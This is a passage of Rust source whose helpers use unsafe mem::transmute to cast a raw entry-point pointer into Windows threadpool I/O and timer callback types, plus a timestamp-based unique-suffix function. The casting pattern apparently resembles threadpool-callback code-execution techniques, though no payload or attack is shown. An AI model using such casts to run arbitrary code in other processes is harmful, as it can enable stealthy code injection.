        mem::transmute::<PVOID, unsafe extern "system" fn(PTP_CALLBACK_INSTANCE, PVOID, PVOID, u32, usize, PTP_IO)>(ep)
    })
}

unsafe fn timer_callback(ep: PVOID) -> PTP_TIMER_CALLBACK {
    Some(unsafe {
        mem::transmute::<PVOID, unsafe extern "system" fn(PTP_CALLBACK_INSTANCE, PVOID, PTP_TIMER)>(ep)
    })
}

fn unique_suffix() -> u128 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos()
}
